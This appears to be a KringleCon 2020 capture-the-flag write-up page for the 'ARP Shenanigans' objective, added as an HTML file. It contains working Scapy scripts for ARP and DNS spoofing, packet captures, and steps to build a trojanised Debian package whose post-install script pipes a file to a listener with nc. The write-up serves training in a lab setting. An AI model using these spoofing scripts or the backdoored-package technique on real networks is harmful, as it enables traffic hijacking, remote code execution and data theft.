@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  
+  <link rel="shortcut icon" href="../../../img/favicon.ico">
+  <title>Objective9 - Spartantri KringleCon 2020 Write-Up</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../../../css/theme.css" />
+  <link rel="stylesheet" href="../../../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Objective9";
+    var mkdocs_page_input_path = "objectives/9-ARP-Shenanigans/9-ARP-Shenanigans.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="../../../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../../../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href="../../.." class="icon icon-home"> Spartantri KringleCon 2020 Write-Up</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../..">Home</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../1-Uncover-Santas-Gift-list/1-Uncover-Santas-Gift-list/">Objective1</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../2-Investigate-S3-Bucket/2-Investigate-S3-Bucket/">Objective2</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../3-Point-of-Sale-Password-Recovery/3-Point-of-Sale-Password-Recovery-soulution/">Objective3</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../4-Operate-the-Santavator/4-Operate-the-Santavator/">Objective4</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../5-Open-HID-Lock/5-Open-HID-Lock/">Objective5</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../6-Splunk-Challenge/6-Splunk-Challenge/">Objective6</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../7-Solve-the-sleighs-CAN-D-BUS/7-Solve-the-sleighs-CAN-D-BUS/">Objective7</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../8-Broken-Tag-Generator/8-Broken-Tag-Generator/">Objective8</a>
+                    </li>
+                </ul>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Objective9</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#the-challenge">The challenge</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#the-machine-info">The machine info</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#arp-poisoning">ARP poisoning</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#modified-values-for-arp-poisoning">Modified values for ARP poisoning</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#dns-poisoning">DNS poisoning</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#modified-values-for-dns-poisoning">Modified values for DNS poisoning</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../10-Defeat-Fingerprint-Sensor/10-Defeat-Fingerprint-Sensor/">Objective10</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../11a-Blockchain-Part-1/11a-Blockchain-Part-1/">Objective11a</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../11b-Blockchain-Part-2/11b-Blockchain-Part-2/">Objective11b</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Unescape-Tmux/A-Unescape-Tmux/">AchivementTmux</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Elf-Code/A-Elf-Code/">AchivementElfCode</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Redis/A-Redis/">AchivementRedis</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">AchivementKiosk</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-hiddenspot/A-HiddenSpot/">AchivementHidden</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Speaker-UNPrep/A-Speaker-UNPrep/">AchivementUNPrep</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Sort-O-Matic/A-Sort-O-Matic/">AchivementSortOMatic</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Scapy-Prepper/A-Scapy-Prepper/">AchivementScapyPrepper</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-CAN-Bus-Investigation/A-CAN-Bus-Investigation/">AchivementCAN-BUS</a>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="../../..">Spartantri KringleCon 2020 Write-Up</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Objective9</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="9-arp-shenanigans">9) ARP Shenanigans</h1>
+<p>Difficulty: 4/5</p>
+<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?</p>
+<p>ANSWER: Tanta Kringle</p>
+<h2 id="the-challenge">The challenge</h2>
+<p>Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
+Help the North Pole by getting command line access back to this host.</p>
+<p>Read the HELP.md file for information to help you in this endeavor.</p>
+<p>Note: The terminal lifetime expires after 30 or more minutes so be 
+sure to copy off any essential work you have done as you go.</p>
+<h2 id="the-machine-info">The machine info</h2>
+<p>IP address: 10.6.0.2
+MAC address: 02:42:0a:06:00:02</p>
+<h2 id="arp-poisoning">ARP poisoning</h2>
+<p>To start we run tcpdump to check what ip is sedning the ARP requests.</p>
+<pre><code>guest@29847c69ad6a:~$ tcpdump -n 
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+03:53:50.538344 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+03:53:51.578334 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+</code></pre>
+<p>We take the source IP and MAC addresses and modify the ARP poisoning script including the IP that the target is looking for and we use the scapy script to reply to the request providing the destination IP and the MAC address of the local machine. and we use one of the tmux pane to run the script in the backed.</p>
+<pre><code>scripts/arp_resp.py
+.
+Sent 1 packets.
+</code></pre>
+<h3 id="modified-values-for-arp-poisoning">Modified values for ARP poisoning</h3>
+<pre><code>def handle_arp_packets(packet):
+    # if arp request, then we need to fill this out to send back our mac as the response
+    if ARP in packet and packet[ARP].op == 1:
+        ether_resp = Ether(dst=&quot;4c:24:57:ab:ed:84&quot;, type=0x806, src=&quot;02:42:0a:06:00:02&quot;)
+        arp_response = ARP(pdst=&quot;10.6.6.35&quot;)
+        arp_response.op = 2
+        arp_response.plen = 4
+        arp_response.hwlen = 6
+        arp_response.ptype = 0x800
+        arp_response.hwtype = 0x1
+        arp_response.hwsrc = &quot;02:42:0a:06:00:02&quot;
+        arp_response.psrc = &quot;10.6.6.53&quot;
+        arp_response.hwdst = &quot;4c:24:57:ab:ed:84&quot;
+        arp_response.pdst = &quot;10.6.6.35&quot;
+        response = ether_resp/arp_response
+        sendp(response, iface=&quot;eth0&quot;)
+</code></pre>
+<h2 id="dns-poisoning">DNS poisoning</h2>
+<p>Now we verify that the ARP poisoning is taking place and the type of traffic the target machine is sending with <code>tcpdump</code>.</p>
+<pre><code>guest@29847c69ad6a:~$ tcpdump -n 
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+04:16:15.602338 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+04:16:15.618236 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
+04:16:15.646731 IP 10.6.6.35.22953 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
+</code></pre>
+<p>Now we modify the DNS poisoning script with the information we already know so it respond to all DNS requests giving our own machin IP and MAC addresses as destination.</p>
+<h3 id="modified-values-for-dns-poisoning">Modified values for DNS poisoning</h3>
+<p>```ipaddr_we_arp_spoofed = "10.6.6.53"
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    dstport=packet[IP][UDP].sport
+    srcport=packet[IP][UDP].dport
+    dstmac=packet[Ether].src
+    srcmac=packet[Ether].dst
+    eth = Ether(src=srcmac, dst=dstmac)   # need to replace mac addresses
+    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
+    udp = UDP(dport=dstport, sport=srcport)                             # need to replace ports
+    dns = DNS(
+        # MISSING DNS RESPONSE LAYER VALUES
+        id=packet[DNS].id, qr=1, opcode=0,
+        aa=1, tc=0, rd=1, ra=1, z=0, ad=0, rcode=0,
+        qdcount=1, ancount=1, nscount=0, arcount=0, 
+        qd=DNSQR(qname=packet[DNS].qd.qname, qtype='A', qclass=1),
+        an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass=1,
+        ttl=600, rdata="10.6.0.2")
+    )
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface="eth0")</p>
+<pre><code>## Verify incoming traffic
+Now we run the DNS poisoning script in another pane and verify that both the ARP and the DNS poisoning attacks are working.
+</code></pre>
+<p>guest@29847c69ad6a:~$ tcpdump -n src host 10.6.6.35
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+04:32:19.882406 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+04:32:20.481564 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [S.], seq 4256394238, ack 32042649, win 65160, options [mss 1460,sackOK,TS val 626668882 ecr 2887327827,nop,wscale 7], length 0
+04:32:20.482458 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [.], ack 518, win 506, options [nop,nop,TS val 626668883 ecr 2887327828], length 0
+04:32:20.483909 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [P.], seq 1:1514, ack 518, win 506, options [nop,nop,TS val 626668884 ecr 2887327828], length 1513
+04:32:20.484946 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [P.], seq 1514:1769, ack 598, win 506, options [nop,nop,TS val 626668885 ecr 2887327830], length 255
+04:32:20.485190 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [P.], seq 1769:2024, ack 810, win 505, options [nop,nop,TS val 626668886 ecr 2887327831], length 255
+04:32:20.488384 IP 10.6.6.35.45802 &gt; 10.6.0.2.80: Flags [S], seq 1443649395, win 64240, options [mss 1460,sackOK,TS val 626668889 ecr 0,nop,wscale 7], length 0
+04:32:20.489449 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [FP.], seq 2024:2244, ack 810, win 505, options [nop,nop,TS val 626668890 ecr 2887327831], length 220
+04:32:20.490952 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [.], ack 811, win 505, options [nop,nop,TS val 626668891 ecr 2887327836], length 0
+04:32:20.522762 IP 10.6.6.35.49790 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
+04:32:20.934339 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28</p>
+<pre><code>
+The machine is now receiving request from the poisoned machine on port 80, to verify the type of requests the machine receives we use `python3` `http.server` module.
+</code></pre>
+<p>uest@29847c69ad6a:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.6.6.35 - - [21/Dec/2020 04:34:47] code 404, message File not found
+10.6.6.35 - - [21/Dec/2020 04:34:47] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -</p>
+<pre><code>
+The server receives requests for a debian package `/pub/jfrost/backdoor/suriv_amd64.deb`, so we can use that to deliver a malicious package and retrieve the flag.
+
+## Building malicious deb pakcage
+We reuse one fo teh packages already present on the machine to build our malicious payload.
+</code></pre>
+<p>cd debs
+dpkg -x nano_4.8-1ubuntu1_amd64.deb work
+mkdir work/DEBIAN
+ar -x nano_4.8-1ubuntu1_amd64.deb
+xz -d -v control.tar.xz
+tar -xvf control.tar ./control
+tar -xvf control.tar ./postinst
+mv control work/DEBIAN/
+mv postinst work/DEBIAN/</p>
+<pre><code>We modify the post installation script to exfiltrate the contents of the file we want and we set our machine to listen on the port we specify on the script.
+</code></pre>
+<p>work/DEBIAN/postinst  contents 
+---START---</p>
+<h1 id="binsh">!/bin/sh</h1>
+<p>if [ "$1" = "configure" ] || [ "$1" = "abort-upgrade" ]; then
+            update-alternatives --install /usr/bin/editor editor /bin/nano 40 \
+                          --slave /usr/share/man/man1/editor.1.gz editor.1.gz \
+                                /usr/share/man/man1/nano.1.gz
+                update-alternatives --install /usr/bin/pico pico /bin/nano 10 \
+                              --slave /usr/share/man/man1/pico.1.gz pico.1.gz \
+                                    /usr/share/man/man1/nano.1.gz
+fi</p>
+<p>echo "<code>cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt |base64</code>" |nc 10.6.0.2 8000
+---END---</p>
+<pre><code>We finish building the package and create the correct directory structure to match the incoming requests
+</code></pre>
+<p>dpkg-deb --build work/
+mkdir -p pub/jfrost/backdoor
+mv work.deb pub/jfrost/backdoor/suriv_amd64.deb</p>
+<pre><code>
+## Setup the exfiltration listener
+We set `nc` to listen in port `8000` as we configured our payload and perform the decoding in another `tmux` pane.
+</code></pre>
+<p>nc -lvp 8000 |base64 -d |tee -a NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</p>
+<pre><code>
+## Serving the malicious payload
+We set `python` `http.server` module to listen on port `80` and serve the file.
+</code></pre>
+<p>python3 -m http.server 80</p>
+<pre><code>
+## Exfiltrated file
+</code></pre>
+<p>January 20, 2020</p>
+<p>Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole</p>
+<p>Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.</p>
+<p>Roll call of Board members please:
+Chairman Jack Frost - Present
+Vice Chairman Mother Nature - Present</p>
+<p>Superman - Present
+Clarice - Present
+Yukon Cornelius - HERE!
+Ginger Breaddie - Present
+King Moonracer - Present
+Mrs. Donner - Present
+Tanta Kringle - Present
+Charlie In-the-Box - Here
+Krampus - Growl
+Dolly - Present
+Snow Miser - Heya!
+Alabaster Snowball - Hello
+Queen of the Winter Spirits - Present</p>
+<p>ALSO PRESENT:
+                Kris Kringle
+                Pepper Minstix
+                Heat Miser
+                Father Time</p>
+<p>Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.</p>
+<p>Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.</p>
+<p>OLD BUSINESS: No Old Business.</p>
+<p>RESOLUTIONS:
+The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  </p>
+<p>Approved:
+Mother Nature
+Superman
+Clarice
+Yukon Cornelius
+Ginger Breaddie
+King Moonracer
+Mrs. Donner
+Charlie In the Box
+Krampus
+Dolly
+Snow Miser
+Alabaster Snowball
+Queen of the Winter Spirits</p>
+<p>Opposed: 
+                Jack Frost</p>
+<p>Resolution carries.  Construction approved.</p>
+<p>NEW BUSINESS:
+```</p>
+<p>ANSWER: Tanta Kringle</p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../../10-Defeat-Fingerprint-Sensor/10-Defeat-Fingerprint-Sensor/" class="btn btn-neutral float-right" title="Objective10">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../../8-Broken-Tag-Generator/8-Broken-Tag-Generator/" class="btn btn-neutral" title="Objective8"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../../8-Broken-Tag-Generator/8-Broken-Tag-Generator/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="../../10-Defeat-Fingerprint-Sensor/10-Defeat-Fingerprint-Sensor/" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme.js" defer></script>
+      <script src="../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
